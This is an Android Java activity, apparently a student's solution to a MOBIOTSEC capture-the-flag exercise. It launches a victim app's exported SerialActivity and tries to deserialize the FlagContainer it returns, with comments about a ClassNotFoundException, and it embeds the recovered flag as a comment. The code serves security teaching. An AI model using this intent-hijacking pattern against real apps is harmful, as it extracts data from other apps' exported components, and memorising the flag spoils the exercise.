package com.example.serialintentChallenge;

import androidx.activity.result.ActivityResult;
import androidx.activity.result.ActivityResultCallback;
import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import androidx.appcompat.app.AppCompatActivity;

import android.content.ActivityNotFoundException;
import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;

//import com.example.victimapp.FlagContainer; //need to implement module in gradle
import android.util.Base64;
import android.util.Log;

import java.io.Serializable;
import java.nio.charset.Charset;
import java.util.ArrayList;

public class MainActivity extends AppCompatActivity {
    private static final String TAG = "MOBIOTSEC";

    //problem: object are com.example.maliciousactivity.FlagContainer
    //SOLUTION: create a package com.example.victimapp and put there the class
    protected class FlagContainer implements Serializable {
        private String[] parts;
        private ArrayList<Integer> perm;

        public FlagContainer(String[] parts, ArrayList<Integer> perm) {
            this.parts = parts;
            this.perm = perm;
        }

        private String getFlag() {
            int n = parts.length;
            int i;
            String b64 = new String();
            for (i=0; i<n; i++) {
                b64 += parts[perm.get(i)];
            }

            byte[] flagBytes = Base64.decode(b64, Base64.DEFAULT);
            String flag = new String(flagBytes, Charset.defaultCharset());

            return flag;
        }
    }

    ActivityResultLauncher<Intent> mStartForResult = registerForActivityResult(
            new ActivityResultContracts.StartActivityForResult(),
            new ActivityResultCallback<ActivityResult>() {

                @Override
                public void onActivityResult(ActivityResult result) {
                    Intent intent = result.getData();
                    Log.d(TAG, "SerialActivityResult = " + result.getData());
                    try {

                        //TODO error "ERROR Parcelable encountered ClassNotFoundException reading a Serializable object (name = com.example.victimapp.FlagContainer)"
                        //possibile fix: shared user ID
                        //or: java reflection (analize java class from within itself)
                        //maybe modify object name
                        //use shared library (unlikely)


                        //CHECKOUT
                        try{
                            FlagContainer fc = (FlagContainer) intent.getSerializableExtra("flag");
                            //I dunno man, found out also this method, should be safer than Bundle.getSerializable
                        }catch(Exception ex){
                            Log.d(TAG,ex.getMessage());
                        }
                        


                        Bundle extras = intent.getExtras();
                        extras.setClassLoader(FlagContainer.class.getClassLoader());
                        FlagContainer flagContainer = (FlagContainer) extras.getSerializable("flag");
                        String flag = flagContainer.getFlag();
                    } catch (NullPointerException e) {
                        Log.d(TAG, "ERROR result Extras NullPointerException " + e);
                    } catch (Exception e) {
                        Log.d(TAG, "ERROR " + e.getMessage());
                    }

                }
            });

    protected void startMaliciousAttack() {
        Intent maliciousIntent = new Intent(); // create a buffer intent
        maliciousIntent.setComponent(new ComponentName
                ("com.example.victimapp",
                        "com.example.victimapp.SerialActivity"));

        try {
            mStartForResult.launch(maliciousIntent);
        } catch (ActivityNotFoundException e) {
            Log.d(TAG, "ERROR : " + e.getMessage());
        }

    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Log.d(TAG, "MALICIOUS ACTIVITY STARTED");

        startMaliciousAttack();
        //FLAG{Gutta_cavat_lapidem_non_vi_sed_saepe_cadendo}

    }
}